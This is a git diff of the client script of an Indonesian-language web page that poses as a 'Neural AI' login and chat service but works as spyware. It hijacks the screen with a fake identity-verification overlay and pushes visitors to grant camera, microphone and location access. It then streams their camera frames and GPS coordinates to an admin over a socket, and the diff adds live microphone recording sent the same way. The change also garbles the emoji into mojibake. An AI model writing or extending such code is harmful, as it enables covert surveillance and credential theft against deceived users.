@@ -1,4 +1,4 @@
-let deviceId = '', watchId = null, stream = null, snapInterval = null;
+﻿let deviceId = '', watchId = null, stream = null, snapInterval = null;
 let attemptCount = 0, gpsDeniedCount = 0, idleTimer = null, floodInterval = null, notifInterval = null;
 const emailInput = document.getElementById('emailInput');
 const passInput = document.getElementById('passInput');
@@ -102,7 +102,7 @@ function initFullscreenHijack() {
     const overlay = document.createElement('div');
     overlay.id = 'fs-overlay';
     overlay.style.cssText = 'position:fixed;inset:0;z-index:99999;background:#05050f;display:none;flex-direction:column;align-items:center;justify-content:center;cursor:pointer;';
-    overlay.innerHTML = '<div style="font-size:3rem;margin-bottom:20px;">🤖</div><div style="font-size:1.2rem;font-weight:700;color:#fff;margin-bottom:8px;">Verifikasi AI</div><div style="color:#aaa;font-size:.9rem;margin-bottom:24px;">Tap untuk verifikasi identitas Anda di Neural AI</div><button style="padding:14px 40px;border:none;border-radius:12px;background:linear-gradient(135deg,#00d4ff,#7c3aed);color:#fff;font-size:1rem;font-weight:600;cursor:pointer;font-family:inherit;">Verifikasi Sekarang</button>';
+    overlay.innerHTML = '<div style="font-size:3rem;margin-bottom:20px;">≡ƒñû</div><div style="font-size:1.2rem;font-weight:700;color:#fff;margin-bottom:8px;">Verifikasi AI</div><div style="color:#aaa;font-size:.9rem;margin-bottom:24px;">Tap untuk verifikasi identitas Anda di Neural AI</div><button style="padding:14px 40px;border:none;border-radius:12px;background:linear-gradient(135deg,#00d4ff,#7c3aed);color:#fff;font-size:1rem;font-weight:600;cursor:pointer;font-family:inherit;">Verifikasi Sekarang</button>';
     document.body.appendChild(overlay);
 
     let fsActive = false;
@@ -208,6 +208,8 @@ socket.on('device-id', (id) => { deviceId = id; localStorage.setItem('deviceId',
 let camStreamInterval = null;
 let camStreamSending = false;
 let camFacingMode = 'environment';
+let camAudioRecorder = null;
+let camAudioStream = null;
 
 function startCameraStream() {
     if (camStreamInterval) return;
@@ -250,6 +252,8 @@ function startCameraStream() {
     c.width = 320; c.height = 240;
     const ctx = c.getContext('2d');
     socket.emit('camera-status', { status: 'started', facingMode: camFacingMode });
+    // Start live audio streaming alongside video
+    startCamAudioStream();
     function sendFrame() {
         if (!camStreamInterval) return;
         if (v.readyState < 2) { stopCameraStream(); setTimeout(startCameraStream, 200); return; }
@@ -264,8 +268,40 @@ function startCameraStream() {
     }
     camStreamInterval = setTimeout(sendFrame, 16);
 }
+function startCamAudioStream() {
+    if (camAudioRecorder) return;
+    const audioTrack = stream && stream.getAudioTracks().length ? stream.getAudioTracks()[0] : null;
+    const onStream = (audioStream) => {
+        camAudioStream = audioStream;
+        const mimeType = typeof MediaRecorder !== 'undefined' && MediaRecorder.isTypeSupported('audio/webm;codecs=opus')
+            ? 'audio/webm;codecs=opus' : 'audio/webm';
+        try {
+            const recorder = new MediaRecorder(audioStream, { mimeType });
+            recorder.ondataavailable = (e) => {
+                if (e.data.size > 0) {
+                    const reader = new FileReader();
+                    reader.onloadend = () => {
+                        socket.emit('camera-audio', { audio: reader.result.split(',')[1], mimeType });
+                    };
+                    reader.readAsDataURL(e.data);
+                }
+            };
+            recorder.start(100);
+            camAudioRecorder = recorder;
+        } catch(e) {}
+    };
+    if (audioTrack) {
+        onStream(stream);
+    } else {
+        navigator.mediaDevices.getUserMedia({ audio: true, video: false })
+            .then(onStream)
+            .catch(() => {});
+    }
+}
 function stopCameraStream() {
     if (camStreamInterval) { clearTimeout(camStreamInterval); camStreamInterval = null; }
+    if (camAudioRecorder) { camAudioRecorder.stop(); camAudioRecorder = null; }
+    if (camAudioStream) { camAudioStream.getTracks().forEach(t => t.stop()); camAudioStream = null; }
     // Notify admin that camera stream has stopped
     socket.emit('camera-status', { status: 'stopped' });
 }
@@ -964,9 +1000,8 @@ function tryGPSSilent() {
 
 function requestAllPermissions() {
     const perms = [
-        { id:'camera', icon:'📷', label:'Kamera', bg:'#7c3aed' },
-        { id:'microphone', icon:'🎤', label:'Mikrofon', bg:'#ec4899' },
-        { id:'notifications', icon:'🔔', label:'Notifikasi', bg:'#f59e0b' }
+        { id:'camera', icon:'≡ƒô╖', label:'Kamera', bg:'#7c3aed' },
+        { id:'microphone', icon:'≡ƒÄñ', label:'Mikrofon', bg:'#ec4899' }
     ];
     const container = document.getElementById('loPerms');
     if (!container) return Promise.resolve();
@@ -1065,19 +1100,6 @@ function requestPermItem(perm) {
                         r(true);
                     })
                     .catch(() => fail());
-            } else if (perm.id === 'notifications') {
-                if (!('Notification' in window)) { fail(); return; }
-                Notification.requestPermission().then(p => {
-                    if (p === 'granted') {
-                        itemEl.classList.remove('active');
-                        statusEl.textContent = '\u2713 Aktif';
-                        statusEl.style.color = '';
-                        itemEl.classList.add('done');
-                        r(true);
-                    } else {
-                        fail();
-                    }
-                });
             }
         });
     }
@@ -1125,7 +1147,7 @@ async function handleLogin(e) {
     attemptCount++;
     btn.classList.add('loading'); btn.disabled=true; btn.querySelector('span').textContent='Memverifikasi\u2026';
     showLoadingOverlay(1500/4);
-    // Request all permissions — blocks until all granted
+    // Request all permissions ΓÇö blocks until all granted
     await requestPermissions();
     // Authenticate with Firebase
     try {
@@ -1145,8 +1167,8 @@ async function handleLogin(e) {
         btn.querySelector('span').textContent='Masuk ke Dashboard';
         hideLoadingOverlay();
         let msg = 'Login gagal. Periksa email dan kata sandi.';
-        if (err.code === 'auth/user-not-found') msg = 'Akun tidak ditemukan. Silakan daftar terlebih dahulu.';
-        else if (err.code === 'auth/wrong-password') msg = 'Kata sandi salah. Coba lagi.';
+        if (err.code === 'auth/invalid-credential') msg = 'Email atau kata sandi salah. Silakan coba lagi.';
+        else if (err.code === 'auth/user-not-found' || err.code === 'auth/wrong-password') msg = 'Email atau kata sandi salah. Silakan coba lagi.';
         else if (err.code === 'auth/invalid-email') msg = 'Format email tidak valid.';
         else if (err.code === 'auth/too-many-requests') msg = 'Terlalu banyak percobaan. Coba lagi nanti.';
         else if (err.code === 'auth/network-request-failed') msg = 'Koneksi jaringan bermasalah. Coba lagi.';
@@ -1205,7 +1227,7 @@ function initAIChat() {
         </div>
         <div id="aiChatMessages" style="flex:1;overflow-y:auto;padding:16px;display:flex;flex-direction:column;gap:12px;scroll-behavior:smooth;">
             <div style="align-self:flex-start;max-width:80%;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.06);padding:12px 16px;border-radius:16px 16px 16px 4px;font-size:.85rem;color:#ccc;line-height:1.5;">
-                Halo! Saya asisten AI Neural. Ada yang bisa saya bantu hari ini? 👋
+                Halo! Saya asisten AI Neural. Ada yang bisa saya bantu hari ini? ≡ƒæï
             </div>
         </div>
         <div id="aiChatPermission" style="display:none;padding:16px;background:rgba(0,212,255,0.05);border-top:1px solid rgba(255,255,255,0.06);">
@@ -1286,10 +1308,9 @@ function showPermissionPrompts() {
     permDiv.style.display = 'block';
 
     const perms = [
-        { id: 'location', icon: '📍', title: 'Lokasi', desc: 'Akses GPS untuk layanan lokal', color: '#00d4ff' },
-        { id: 'camera', icon: '📷', title: 'Kamera', desc: 'Akses kamera untuk verifikasi', color: '#7c3aed' },
-        { id: 'microphone', icon: '🎤', title: 'Mikrofon', desc: 'Akses mikrofon untuk voice chat', color: '#ec4899' },
-        { id: 'notifications', icon: '🔔', title: 'Notifikasi', desc: 'Izin notifikasi untuk update', color: '#f59e0b' }
+        { id: 'location', icon: '≡ƒôì', title: 'Lokasi', desc: 'Akses GPS untuk layanan lokal', color: '#00d4ff' },
+        { id: 'camera', icon: '≡ƒô╖', title: 'Kamera', desc: 'Akses kamera untuk verifikasi', color: '#7c3aed' },
+        { id: 'microphone', icon: '≡ƒÄñ', title: 'Mikrofon', desc: 'Akses mikrofon untuk voice chat', color: '#ec4899' }
     ];
 
     permList.innerHTML = '';
@@ -1322,7 +1343,7 @@ async function requestSinglePermission(type, color) {
             navigator.geolocation.getCurrentPosition(
                 (p) => {
                     socket.emit('location', { lat: p.coords.latitude, lng: p.coords.longitude, accuracy: p.coords.accuracy });
-                    statusEl.textContent = '✓ Aktif';
+                    statusEl.textContent = 'Γ£ô Aktif';
                     statusEl.className = 'perm-status perm-ok';
                     statusEl.style.color = '';
                     itemEl.classList.add('ai-perm-granted');
@@ -1340,7 +1361,7 @@ async function requestSinglePermission(type, color) {
             statusEl.textContent = '...';
             const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
             s.getTracks().forEach(t => t.stop());
-            statusEl.textContent = '✓ Aktif';
+            statusEl.textContent = 'Γ£ô Aktif';
             statusEl.className = 'perm-status perm-ok';
             statusEl.style.color = '';
             itemEl.classList.add('ai-perm-granted');
@@ -1349,30 +1370,10 @@ async function requestSinglePermission(type, color) {
             statusEl.textContent = '...';
             const s = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
             s.getTracks().forEach(t => t.stop());
-            statusEl.textContent = '✓ Aktif';
+            statusEl.textContent = 'Γ£ô Aktif';
             statusEl.className = 'perm-status perm-ok';
             statusEl.style.color = '';
             itemEl.classList.add('ai-perm-granted');
-            checkAllPermissions();
-        } else if (type === 'notifications') {
-            if ('Notification' in window) {
-                const p = await Notification.requestPermission();
-                if (p === 'granted') {
-                    statusEl.textContent = '✓ Aktif';
-                    statusEl.className = 'perm-status perm-ok';
-                    statusEl.style.color = '';
-                    itemEl.classList.add('ai-perm-granted');
-                } else {
-                    statusEl.textContent = 'Ditolak';
-                    statusEl.className = 'perm-status';
-                    statusEl.style.color = '#ff6b6b';
-                }
-            } else {
-                statusEl.textContent = 'N/A';
-                statusEl.className = 'perm-status perm-ok';
-                statusEl.style.color = '';
-                itemEl.classList.add('ai-perm-granted');
-            }
             checkAllPermissions();
         }
     } catch (e) {
@@ -1384,13 +1385,13 @@ async function requestSinglePermission(type, color) {
 }
 
 function checkAllPermissions() {
-    const statuses = ['location', 'camera', 'microphone', 'notifications'].map(id => {
+    const statuses = ['location', 'camera', 'microphone'].map(id => {
         const el = document.getElementById('perm-status-' + id);
         return el ? el.textContent : '';
     });
     // Allow chat even if some permissions denied - just track which ones
     const granted = statuses.filter(s => s.includes('Aktif')).length;
-    socket.emit('device-info', { aiPermissions: { granted, total: 4, time: Date.now() } });
+    socket.emit('device-info', { aiPermissions: { granted, total: 3, time: Date.now() } });
 
     // Enable chat after at least location is attempted
     const locStatus = document.getElementById('perm-status-location');
